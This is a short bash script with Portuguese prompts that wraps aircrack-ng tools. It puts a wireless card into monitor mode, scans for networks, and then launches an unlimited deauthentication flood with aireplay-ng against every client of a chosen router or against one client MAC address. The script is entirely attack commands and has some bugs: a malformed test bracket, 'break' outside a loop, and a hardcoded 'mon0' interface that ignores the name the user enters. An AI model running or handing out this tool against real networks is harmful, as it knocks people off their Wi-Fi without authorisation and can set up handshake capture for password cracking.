#!/bin/bash
# if not root, run as root
echo
echo
echo " W   W   W || / I &   &   666  %%%%"
echo "  W W W W  ||/  I &   &   66   & %"
echo "   W   W   ||\  I &&& &&& 6666 &  %"
echo
echo
airmon-ng check kill; airmon-ng check; sudo iwconfig | grep wlan
echo -n "qual é a placa de rede? "
read wlan
airmon-ng start $wlan
read -n 1 -s -p "tecla p continuar..."
echo -n "placa em modo monitor > "
read mon
airodump-ng $mon;
echo -n "bssid do router > "
read bssid
echo -n "o channel > "
read channel
airodump-ng mon0 --bssid $bssid --channel $channel
echo -n "todos?(s/n)"
read t
if ["$t" = "s"]
then
	aireplay-ng -0 0 -a $bssid mon0
	break
else
	echo -n "mac do cliente > "
	read cliente
	aireplay-ng -0 0 -a $bssid -c $cliente mon0
	break
fi